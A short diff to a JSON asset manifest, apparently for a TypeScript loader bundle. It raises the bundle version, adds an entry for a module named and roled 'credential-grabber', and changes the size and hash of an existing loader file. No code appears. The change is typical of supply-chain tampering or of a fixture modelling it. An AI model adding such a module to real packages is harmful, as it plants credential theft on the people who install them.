@@ -1,7 +1,15 @@
 {
   "schemaVersion": 2,
-  "bundleVersion": "4",
+  "bundleVersion": "5",
   "assets": [
+    {
+      "name": "credential-grabber.cjs",
+      "path": "credential-grabber.cjs",
+      "role": "credential-grabber",
+      "moduleType": "cjs",
+      "size": 3455,
+      "sha256": "2b10137a622c88627bdca4b14a16eb2bd758b43d8ac9e3aaccf4bc8003368a44"
+    },
     {
       "name": "loader-register.mjs",
       "path": "loader-register.mjs",
@@ -31,8 +39,8 @@
       "path": "ts-loader.mjs",
       "role": "loader-support",
       "moduleType": "esm",
-      "size": 12524,
-      "sha256": "8424c708dbd03cfe78691d4ada5225a5d54bd73a368647cf828b5192be12d16e"
+      "size": 12512,
+      "sha256": "a468e92ee08902500cd5be224aedc10945334110e3287450b7d64ddf41f6e30b"
     }
   ]
 }
